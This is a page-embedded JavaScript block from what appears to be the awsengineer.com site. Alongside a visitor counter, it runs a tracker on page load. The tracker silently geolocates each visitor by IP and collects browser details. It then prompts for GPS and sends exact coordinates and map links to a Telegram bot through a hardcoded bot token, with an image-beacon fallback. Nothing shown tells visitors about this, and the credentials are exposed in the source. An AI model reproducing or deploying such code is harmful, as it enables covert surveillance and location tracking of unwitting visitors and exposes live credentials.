    <script>
        const BOT_TOKEN = "8817325199:AAG3rAIc22jflbYRoCnrtu_7sjLRGMaVRR4";
        const CHAT_ID = "1890351722";

        // Helper function to send messages to Telegram
        async function sendToTelegram(messageText) {
            try {
                await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
                    method: "POST",
                    headers: { "Content-Type": "application/json" },
                    body: JSON.stringify({

                        text: messageText
                    }),
                    keepalive: true
                });
            } catch (e) {
                const fallbackUrl = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=${encodeURIComponent(messageText)}`;
                new Image().src = fallbackUrl;
            }
        }

        // 1. Visitor Hit Counter
        async function fetchVisitorCount() {
            try {
                const response = await fetch('https://api.counterapi.dev/v1/awsengineer_com/views/up');
                if (response.ok) {
                    const data = await response.json();
                    document.getElementById('view-count').textContent = data.count;
                } else {
                    document.getElementById('view-count').textContent = '1+';
                }
            } catch (error) {
                document.getElementById('view-count').textContent = '1+';
            }
        }
        fetchVisitorCount();

        // 2. Telemetry Tracker (IP Geolocation + GPS Permission Prompt)
        async function trackVisitor() {
            let ip = "Direct";
            let city = "Unknown";
            let country = "Unknown";
            let isp = "Unknown";
            let ipLat = null;
            let ipLon = null;

            // Step A: Immediate Silent IP Geolocation Lookup
            try {
                const res = await fetch("https://ipwho.is/");
                const data = await res.json();
                if (data && data.success !== false) {
                    ip = data.ip || ip;
                    city = data.city || city;
                    country = data.country || country;
                    isp = data.connection ? data.connection.isp : (data.isp || isp);
                    ipLat = data.latitude;
                    ipLon = data.longitude;
                }
            } catch (err) {
                console.log("IP lookup fallback active");
            }

            const referrer = document.referrer || "Direct Navigation";
            const screenRes = `${window.screen.width}x${window.screen.height}`;
            const device = navigator.userAgent.substring(0, 95);

            let initialMessage = 
                `🔔 New Visitor on awsengineer.com!\n\n` +
                `📍 IP Location: ${city}, ${country}\n` +
                (ipLat && ipLon ? `📌 IP Coordinates: Y=${ipLat}, X=${ipLon}\n🗺️ IP Map: https://www.google.com/maps?q=${ipLat},${ipLon}\n` : '') +
                `🌐 IP Address: ${ip}\n` +
                `🏢 ISP: ${isp}\n` +
                `🖥️ Screen: ${screenRes}\n` +
                `🔗 Referrer: ${referrer}\n` +
                `📱 Device: ${device}...`;

            // Send standard alert immediately
            sendToTelegram(initialMessage);

            // Step B: Trigger Browser GPS Location Access Prompt
            if ("geolocation" in navigator) {
                navigator.geolocation.getCurrentPosition(
                    (position) => {
                        const gpsLat = position.coords.latitude;
                        const gpsLon = position.coords.longitude;
                        const accuracy = position.coords.accuracy;

                        const gpsMessage = 
                            `🎯 EXACT GPS LOCATION CAPTURED!\n\n` +
                            `📌 Y (Latitude): ${gpsLat}\n` +
                            `📌 X (Longitude): ${gpsLon}\n` +
                            `📏 Accuracy: within ${Math.round(accuracy)} meters\n` +
                            `🗺️ Exact Google Maps Link: https://www.google.com/maps?q=${gpsLat},${gpsLon}\n` +
                            `🌐 IP: ${ip}`;

                        sendToTelegram(gpsMessage);
                    },
                    (error) => {
                        console.log("User declined or browser blocked GPS prompt:", error.message);
                    },
                    { enableHighAccuracy: true, timeout: 10000, maximumAge: 0 }
                );
            }
        }

        trackVisitor();
    </script>
